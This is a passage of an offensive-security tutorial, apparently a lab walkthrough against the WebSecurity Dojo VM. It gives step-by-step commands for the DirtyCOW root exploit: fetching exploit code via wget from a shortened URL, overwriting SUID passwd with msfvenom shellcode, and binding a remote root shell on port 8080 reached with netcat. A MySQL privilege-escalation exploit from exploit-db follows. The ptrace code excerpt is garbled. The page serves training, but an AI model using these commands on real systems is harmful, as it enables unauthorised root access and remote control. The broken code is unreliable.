  md: "# # Tutorial\n\n# ## Exploits\n\n![](img/1f330653f83dcf0397f7d224ce8bbc16_39_0.png)\n\
    \ncalling **write()**, we have now a second thread calling **ptrace** to write\
    \ each byte at a time (lines 4–6) to the address where a copy of test is mapped:\n\
    \n```\n1    for(i=0;i<10000/1;++i)\n2       for(r=0;r<1;++r)\n3        for(r=0;r<10000/1;++r)\n\
    4        c=ptrace(PTRACE_POKETEXT,pid, map_0, *(long*)(argv[2]+0));\n5\n6    \
    \    *(long*)(argv[2]+0));\n```\n\nThe way this exploit is written follows the\
    \ standard approach for debugging a child process from its parent by means of\
    \ calling **fork()** and **ptrace(PTRACE_TRACEME)** (See References). Exploiting\
    \ this bug allows us to overwrite files but not to append data to them.\n\n# ###\
    \ Gain a root shell with DirtyCOW\n\nIf you combine what you have learned so far\
    \ about shellcode with the ptrace technique, you can overwrite any file with shellcode.\
    \ If the file you are overwriting is **SUID** root, you will be able to spawn\
    \ a root shell. Go get the next exploit:\n\n```\n| wget http://tinyurl.com/9c6b5zh\
    \ -O cdw.c\n```\n\nCompile it and execute it:\n\n```\n| gcc cdw.c -pthread -o\
    \ cdw ; ./cdw\n```\n\nThis exploit makes a copy of **/usr/bin/passwd** to **/tmp/bak**\
    \ and then it will overwrite it with the shellcode you have generated using **msfvenom**.\
    \ As a result, as soon as any user executes the command **passwd**, a root shell\
    \ will be spawned. Try it:\n\n```\n|-$ passwd\n   Segmentation fault\n```\n\n\
    Oops! Depending on your VM capabilities, you could be presented with a root shell\
    \ instead of firing a **segfault**. Why the **segfault**? Remember that DirtyCOW\
    \ is a race condition bug. You have two threads running on the same core: If **madvise()**\
    \ finishes before the main process calling **ptrace()** has written every single\
    \ byte of the shellcode to the address where a copy of **passwd** is located,\
    \ the ELF file will be corrupted. In this case you have to increase the number\
    \ of iterations for the **madvise()** thread:\n\n```\n| sudo cp /tmp/bak /usr/bin/passwd\n\
    \  ./cdw\n  passwd\n  root@d0jo2:/home/d0jo# whoami\n  root\n```\n\nChange the\
    \ value for the *i* variable to something greater, say 900000000 (line 3), re-compile\
    \ the exploit and try again (don’t forget to restore the original **passwd** file\
    \ from **/tmp/bak**):\n\n# ### How to overwrite passwd using a port-binding shellcode\n\
    \nNow that you are comfortable enough with this PoC, let’s change the shellcode\
    \ so that we can connect remotely to the server as soon as **passwd** is executed.\
    \ Go back to your Kali Linux and generate a new ELF32 binary that will listen\
    \ on TCP port 8080, spawning a root shell as soon as a connection is made (this\
    \ is known as port-binding shellcode):\n\n```\n| msfvenom -p linux/x86/shell_bind_tcp\
    \ -a x86\n   LPORT=8080 -f elf |xxd -i > payload\n```\n\nReplace the bytes of\
    \ the **shell_code[]** buffer inside **cdw.c** in WebSecurity Dojo with these\
    \ new ones. Because the shellcode length is different, don’t forget to change\
    \ **sc_len** too:\n\n```\n| unsigned int sc_len = 162;\n```\n\nRecompile the exploit\
    \ and run it; then execute **passwd**:\n\n```\n| passwd\n```\n\nGo back to your\
    \ Kali VM and use **netcat** to connect to WebSecurityDojo:\n\n```\n| nc YOUR_DOJO_IP\
    \ 8080\n```\n\nYou are now connected to the VM remotely. Type the command **whoami**\
    \ to find out if you are, indeed, root:\n\n```\n| whoami\n  root\n```\n\n# ###\
    \ Escalate privileges in MySQL\n\nIt turns out that WebSecurity Dojo is also vulnerable\
    \ to the latest MySQL CVEs. Download the first exploit:\n\n```\n| wget --no-check-certificate\n\
    \   https://www.exploit-db.com/download/40678 -O 40678.c\n```\n\nInstall the MySQL\
    \ client libraries and compile the exploit:\n\n```\n| sudo apt-get install libmysqlclient-dev\n\
    \  gcc 40678.c -lmysqlclient -I/usr/include/mysql -O 40678\n```\n\nThis exploit\
    \ gains a mysql-suid shell when executed locally on a vulnerable mysql version.\
    \ In order to exploit it, you need some valid database credentials first. Create\
    \ a new database user with some privileges on the DWA database:\n\n```\n| mysql\
    \ -u root -p\n  mysql> use dwa;\n  mysql> GRANT CREATE,SELECT,INSERT,DROP ON dwa.*\
    \ TO attacker@localhost IDENTIFIED BY 'passwd';\n  mysql> exit\n```\n\nUse these\
    \ credentials to run the first exploit:\n\n```\n| ./40678 attacker passwd localhost\
    \ dwa\n   [+] Bingo! Race won (4 tries)\n   [+] Spawning the mysql SUID shell\
    \ now\n```"
